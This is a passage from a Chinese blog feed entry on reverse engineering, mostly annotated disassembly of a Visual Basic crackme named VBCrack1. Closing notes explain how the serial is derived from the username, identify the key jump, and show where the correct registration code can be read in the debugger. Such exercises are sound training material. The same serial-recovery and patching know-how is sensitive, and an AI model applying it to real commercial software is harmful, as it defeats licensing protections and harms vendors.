MSVBVM60.__vbaFreeObj</span></div><div class="line"><span class="number">00408471</span>   .  8B4D D0       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x30</span>]</div><div class="line"><span class="number">00408474</span>   .  <span class="number">51</span>            <span class="keyword">push</span> <span class="built_in">ecx</span>                                       <span class="comment">; /String</span></div><div class="line"><span class="number">00408475</span>   .  FF15 <span class="number">10104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaLenBstr&gt;]   <span class="comment">; \__vbaLenBstr</span></div><div class="line">0040847B   .  8BC8          <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">eax</span></div><div class="line"><span class="number">0040847D</span>   .  FF15 <span class="number">98104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaI2I4&gt;]      <span class="comment">;  把4字节整数转化为2字节整数</span></div><div class="line"><span class="number">00408483</span>   .  <span class="number">8945</span> DC       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x24</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">00408486</span>   .  BF <span class="number">01000000</span>   <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="number">0x1</span></div><div class="line">0040848B   &gt;  <span class="number">66</span>:3B7D DC    <span class="keyword">cmp</span> <span class="built_in">di</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x24</span>]</div><div class="line">0040848F   .  0F8F <span class="number">31010000</span> <span class="keyword">jg</span> VBCrack1.004085C6                           <span class="comment">;  大于则跳转</span></div><div class="line"><span class="number">00408495</span>   .  0FBFD7        <span class="keyword">movsx</span> <span class="built_in">edx</span>,<span class="built_in">di</span></div><div class="line"><span class="number">00408498</span>   .  <span class="number">8995</span> 14FFFFFF <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xEC</span>],<span class="built_in">edx</span></div><div class="line">0040849E   .  DB85 14FFFFFF <span class="keyword">fild</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xEC</span>]</div><div class="line">004084A4   .  DD9D 0CFFFFFF <span class="keyword">fstp</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xF4</span>]</div><div class="line">004084AA   .  DD85 0CFFFFFF <span class="keyword">fld</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xF4</span>]</div><div class="line">004084B0   .  DC0D <span class="number">98114000</span> <span class="keyword">fmul</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x401198</span>]                   <span class="comment">;  数据1</span></div><div class="line">004084B6   .  DD5D C8       <span class="keyword">fstp</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x38</span>]</div><div class="line">004084B9   .  DFE0          <span class="keyword">fstsw</span> <span class="built_in">ax</span></div><div class="line">004084BB   .  A8 <span class="number">0D</span>         <span class="keyword">test</span> <span class="built_in">al</span>,<span class="number">0xD</span>                                    <span class="comment">;  13</span></div><div class="line">004084BD   .  0F85 AA040000 <span class="keyword">jnz</span> VBCrack1.<span class="number">0040896D</span></div><div class="line">004084C3   .  8B06          <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</div><div class="line">004084C5   .  <span class="number">56</span>            <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">004084C6   .  FF90 FC020000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x2FC</span>]</div><div class="line">004084CC   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">004084CD   .  8D4D B4       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>]</div><div class="line">004084D0   .  <span class="number">51</span>            <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line">004084D1   .  FFD3          <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line">004084D3   .  8BD8          <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">eax</span></div><div class="line">004084D5   .  8B13          <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</div><div class="line">004084D7   .  8D45 C0       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line">004084DA   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">004084<span class="built_in">DB</span>   .  <span class="number">53</span>            <span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line">004084DC   .  FF92 A0000000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0xA0</span>]                   <span class="comment">;  取用户名</span></div><div class="line">004084E2   .  DBE2          <span class="keyword">fclex</span>                                          <span class="comment">;  清除异常</span></div><div class="line">004084E4   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">004084E6   .  <span class="number">7D</span> <span class="number">12</span>         <span class="keyword">jge</span> XVBCrack1.004084FA                         <span class="comment">;  函数返回正常</span></div><div class="line">004084E8   .  <span class="number">68</span> A0000000   <span class="keyword">push</span> <span class="number">0xA0</span></div><div class="line">004084ED   .  <span class="number">68</span> D05A4000   <span class="keyword">push</span> VBCrack1.00405AD0</div><div class="line">004084F2   .  <span class="number">53</span>            <span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line">004084F3   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">004084F4   .  FF15 <span class="number">48104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaHresultChec&gt;<span class="comment">;  MSVBVM60.__vbaHresultCheckObj</span></div><div class="line">004084FA   &gt;  C745 A8 <span class="number">01000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x58</span>],<span class="number">0x1</span></div><div class="line"><span class="number">00408501</span>   .  C745 A0 <span class="number">02000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x60</span>],<span class="number">0x2</span></div><div class="line"><span class="number">00408508</span>   .  8D4D A0       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x60</span>]</div><div class="line">0040850B   .  <span class="number">51</span>            <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line">0040850C   .  8B95 14FFFFFF <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xEC</span>]</div><div class="line"><span class="number">00408512</span>   .  <span class="number">52</span>            <span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line"><span class="number">00408513</span>   .  8B45 C0       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line"><span class="number">00408516</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="number">00408517</span>   .  FF15 <span class="number">84104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="number">631</span>&gt;]           <span class="comment">;  取到用户名的第一位</span></div><div class="line"><span class="number">0040851D</span>   .  8BD0          <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span></div><div class="line">0040851F   .  8D4D BC       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x44</span>]</div><div class="line"><span class="number">00408522</span>   .  8B1D 3C114000 <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaStrMove&gt;&gt;<span class="comment">;  MSVBVM60.__vbaStrMove</span></div><div class="line"><span class="number">00408528</span>   .  FFD3          <span class="keyword">call</span> <span class="built_in">ebx</span>                                       <span class="comment">;  &lt;&amp;MSVBVM60.__vbaStrMove&gt;</span></div><div class="line">0040852A   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span>                                       <span class="comment">; /String</span></div><div class="line">0040852B   .  FF15 <span class="number">28104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="number">516</span>&gt;]           <span class="comment">; \把字符串返回ASII</span></div><div class="line"><span class="number">00408531</span>   .  0FBFC8        <span class="keyword">movsx</span> <span class="built_in">ecx</span>,<span class="built_in">ax</span></div><div class="line"><span class="number">00408534</span>   .  <span class="number">898D</span> 08FFFFFF <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xF8</span>],<span class="built_in">ecx</span></div><div class="line">0040853A   .  DB85 08FFFFFF <span class="keyword">fild</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xF8</span>]</div><div class="line"><span class="number">00408540</span>   .  DD9D 00FFFFFF <span class="keyword">fstp</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x100</span>]</div><div class="line"><span class="number">00408546</span>   .  DD85 00FFFFFF <span class="keyword">fld</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x100</span>]</div><div class="line">0040854C   .  DC4D C8       <span class="keyword">fmul</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x38</span>]                   <span class="comment">;  乘以上面的数据1</span></div><div class="line">0040854F   .  DFE0          <span class="keyword">fstsw</span> <span class="built_in">ax</span>                                       <span class="comment">;  保存状态字的值到AX</span></div><div class="line"><span class="number">00408551</span>   .  A8 <span class="number">0D</span>         <span class="keyword">test</span> <span class="built_in">al</span>,<span class="number">0xD</span></div><div class="line"><span class="number">00408553</span>   .  0F85 <span class="number">14040000</span> <span class="keyword">jnz</span> VBCrack1.<span class="number">0040896D</span></div><div class="line"><span class="number">00408559</span>   .  83EC <span class="number">08</span>       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">0x8</span></div><div class="line">0040855C   .  DD1C24        <span class="keyword">fstp</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>]                        <span class="comment">;  将st(0)的数保存在目标地址中</span></div><div class="line">0040855F   .  FF15 B0104000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaStrR8&gt;]     <span class="comment">;  将浮点数转化为字符串</span></div><div class="line"><span class="number">00408565</span>   .  8BD0          <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span></div><div class="line"><span class="number">00408567</span>   .  8D4D D0       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x30</span>]</div><div class="line">0040856A   .  FFD3          <span class="keyword">call</span> <span class="built_in">ebx</span>                                       <span class="comment">;  调用MOVE 函数</span></div><div class="line">0040856C   .  8D55 BC       <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x44</span>]</div><div class="line">0040856F   .  <span class="number">52</span>            <span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line"><span class="number">00408570</span>   .  8D45 C0       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line"><span class="number">00408573</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="number">00408574</span>   .  6A <span class="number">02</span>         <span class="keyword">push</span> <span class="number">0x2</span></div><div class="line"><span class="number">00408576</span>   .  FF15 <span class="number">08114000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaFreeStrList&gt;<span class="comment">;  MSVBVM60.__vbaFreeStrList</span></div><div class="line">0040857C   .  83C4 0C       <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0xC</span></div><div class="line">0040857F   .  8D4D B4       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>]</div><div class="line"><span class="number">00408582</span>   .  FF15 <span class="number">58114000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaFreeObj&gt;]   <span class="comment">;  MSVBVM60.__vbaFreeObj</span></div><div class="line"><span class="number">00408588</span>   .  8D4D A0       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x60</span>]</div><div class="line">0040858B   .  FF15 <span class="number">08104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaFreeVar&gt;]   <span class="comment">;  MSVBVM60.__vbaFreeVar</span></div><div class="line"><span class="number">00408591</span>   .  8B4D D0       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x30</span>]</div><div class="line"><span class="number">00408594</span>   .  <span class="number">51</span>            <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line"><span class="number">00408595</span>   .  FF15 F8104000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaR8Str&gt;]     <span class="comment">;  MSVBVM60.__vbaR8Str</span></div><div class="line">0040859B   .  DC45 D4       <span class="keyword">fadd</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2C</span>]                   <span class="comment">;  累加</span></div><div class="line">0040859E   .  DD5D D4       <span class="keyword">fstp</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2C</span>]                   <span class="comment">;  保存ST0</span></div><div class="line">004085A1   .  DFE0          <span class="keyword">fstsw</span> <span class="built_in">ax</span></div><div class="line">004085A3   .  A8 <span class="number">0D</span>         <span class="keyword">test</span> <span class="built_in">al</span>,<span class="number">0xD</span></div><div class="line">004085A5   .  0F85 C2030000 <span class="keyword">jnz</span> VBCrack1.<span class="number">0040896D</span></div><div class="line">004085AB   .  B8 <span class="number">01000000</span>   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x1</span></div><div class="line">004085B0   .  <span class="number">66</span>:03C7       <span class="keyword">add</span> <span class="built_in">ax</span>,<span class="built_in">di</span></div><div class="line">004085B3   .  0F80 B9030000 <span class="keyword">jo</span> VBCrack1<span class="meta">.00408972</span></div><div class="line">004085B9   .  8BF8          <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span></div><div class="line">004085BB   .  8B1D <span class="number">60104000</span> <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaObjSet&gt;] <span class="comment">;  MSVBVM60.__vbaObjSet</span></div><div class="line">004085C1   .^ E9 C5FEFFFF   <span class="keyword">jmp</span> VBCrack1.0040848B                          <span class="comment">;  不断地对用户名做如上浮点运算</span></div><div class="line">004085C6   &gt;  8B16          <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</div><div class="line">004085C8   .  <span class="number">56</span>            <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line">004085C9   .  FF92 <span class="number">00030000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x300</span>]</div><div class="line">004085CF   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">004085D0   .  8D45 B4       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>]</div><div class="line">004085D3   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">004085D4   .  FFD3          <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line">004085D6   .  8BF8          <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span></div><div class="line">004085D8   .  8B0F          <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>]</div><div class="line">004085DA   .  8D55 C0       <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line">004085<span class="built_in">DD</span>   .  <span class="number">52</span>            <span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line">004085DE   .  <span class="number">57</span>            <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line">004085DF   .  FF91 A0000000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0xA0</span>]                   <span class="comment">;  取出注册码</span></div><div class="line">004085E5   .  DBE2          <span class="keyword">fclex</span></div><div class="line">004085E7   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line">004085E9   .  <span class="number">7D</span> <span class="number">12</span>         <span class="keyword">jge</span> XVBCrack1.004085FD</div><div class="line">004085EB   .  <span class="number">68</span> A0000000   <span class="keyword">push</span> <span class="number">0xA0</span></div><div class="line">004085F0   .  <span class="number">68</span> D05A4000   <span class="keyword">push</span> VBCrack1.00405AD0</div><div class="line">004085F5   .  <span class="number">57</span>            <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line">004085F6   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">004085F7   .  FF15 <span class="number">48104000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaHresultChec&gt;<span class="comment">;  MSVBVM60.__vbaHresultCheckObj</span></div><div class="line">004085FD   &gt;  8B45 C0       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line"><span class="number">00408600</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="number">00408601</span>   .  FF15 F8104000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaR8Str&gt;]     <span class="comment">;  转化为浮点数、</span></div><div class="line"><span class="number">00408607</span>   .  DC5D D4       <span class="keyword">fcomp</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x2C</span>]                  <span class="comment">;  比较注册码</span></div><div class="line">0040860A   .  DFE0          <span class="keyword">fstsw</span> <span class="built_in">ax</span></div><div class="line">0040860C   .  F6C4 <span class="number">40</span>       <span class="keyword">test</span> <span class="number">ah</span>,<span class="number">0x40</span></div><div class="line">0040860F   .  <span class="number">74</span> <span class="number">07</span>         <span class="keyword">je</span> XVBCrack1<span class="meta">.00408618</span></div><div class="line"><span class="number">00408611</span>   .  B8 <span class="number">01000000</span>   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x1</span>                                    <span class="comment">;  最高位不相等赋值为1</span></div><div class="line"><span class="number">00408616</span>   .  EB <span class="number">02</span>         <span class="keyword">jmp</span> XVBCrack1.0040861A</div><div class="line"><span class="number">00408618</span>   &gt;  33C0          <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                                    <span class="comment">;  相等赋值为0</span></div><div class="line">0040861A   &gt;  F7D8          <span class="keyword">neg</span> <span class="built_in">eax</span>                                        <span class="comment">;  求补</span></div><div class="line">0040861C   .  <span class="number">66</span>:8BF8       <span class="keyword">mov</span> <span class="built_in">di</span>,<span class="built_in">ax</span></div><div class="line">0040861F   .  8D4D C0       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line"><span class="number">00408622</span>   .  FF15 <span class="number">54114000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaFreeStr&gt;]   <span class="comment">;  MSVBVM60.__vbaFreeStr</span></div><div class="line"><span class="number">00408628</span>   .  8D4D B4       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>]</div><div class="line">0040862B   .  FF15 <span class="number">58114000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;MSVBVM60.__vbaFreeObj&gt;]   <span class="comment">;  MSVBVM60.__vbaFreeObj</span></div><div class="line"><span class="number">00408631</span>   .  <span class="number">66</span>:85FF       <span class="keyword">test</span> <span class="built_in">di</span>,<span class="built_in">di</span></div><div class="line"><span class="number">00408634</span>   .  0F84 B9020000 <span class="keyword">je</span> VBCrack1.004088F3</div><div class="line">0040863A   .  8B0E          <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</div><div class="line">0040863C   .  <span class="number">56</span>            <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line"><span class="number">0040863D</span>   .  FF91 <span class="number">00030000</span> <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x300</span>]</div><div class="line"><span class="number">00408643</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="number">00408644</span>   .  8D55 B0       <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x50</span>]</div><div class="line"><span class="number">00408647</span>   .  <span class="number">52</span>            <span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line"><span class="number">00408648</span>   .  FFD3          <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line">0040864A   .  <span class="number">8985</span> 34FFFFFF <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xCC</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">00408650</span>   .  8B06          <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</div><div class="line"><span class="number">00408652</span>   .  <span class="number">56</span>            <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line"><span class="number">00408653</span>   .  FF90 FC020000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x2FC</span>]</div><div class="line"><span class="number">00408659</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">0040865A   .  8D4D B4       <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4C</span>]</div><div class="line"><span class="number">0040865D</span>   .  <span class="number">51</span>            <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line">0040865E   .  FFD3          <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line"><span class="number">00408660</span>   .  8BF8          <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span></div><div class="line"><span class="number">00408662</span>   .  8B17          <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>]</div><div class="line"><span class="number">00408664</span>   .  8D45 C0       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x40</span>]</div><div class="line"><span class="number">00408667</span>   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"><span class="number">00408668</span>   .  <span class="number">57</span>            <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line"><span class="number">00408669</span>   .  FF92 A0000000 <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0xA0</span>]</div><div class="line">0040866F   .  DBE2          <span class="keyword">fclex</span></div><div class="line"><span class="number">00408671</span>   .  85C0          <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="number">00408673</span>   .  <span class="number">7D</span> <span class="number">12</span>         <span class="keyword">jge</span> XVBCrack1<span class="meta">.00408687</span>                         <span class="comment">;  关键跳转</span></div></pre></td></tr></table></figure></li><li><p>5)对于这个函数，网上给的解释有点问题，我自己去跟到内存地址里面，发现这是一个取第一个字符的函数。<br><img src="https://i.imgur.com/ON7Ftcp.png" alt=""><br><img src="https://i.imgur.com/hpo0U7u.png" alt=""></p></li><li>6）对于关键跳，首先这是一个大型跳转，需要警惕往下翻，出现了一个msg，说明这个是一个成功的弹窗（假码没有msg）。说明这个不能跳。</li><li>7）如何查看正确的注册码？？在fcomp比较指令处查看即可！<br><img src="https://i.imgur.com/X8lEAOQ.png" alt=""><br><img src="https://i.imgur.com/xIrUCxv.png" alt=""></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;例子1：&quot;&gt;&lt;a href=&quot;#例子1：&quot; class=&quot;headerlink&quot; title=&quot;例子1：&quot;&gt;&lt;/a&gt;例子1：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;思路&amp;amp;步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1）查壳&lt;/li&gt;
&lt;li&gt;2）测试发现，这个程序错误没有提示，我们对vbaLenBstr下断，注意对这个函数下断，最好使用IDA 对这个函数进行交叉参考，不然找不到正确的函数。
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向工程例题</title>
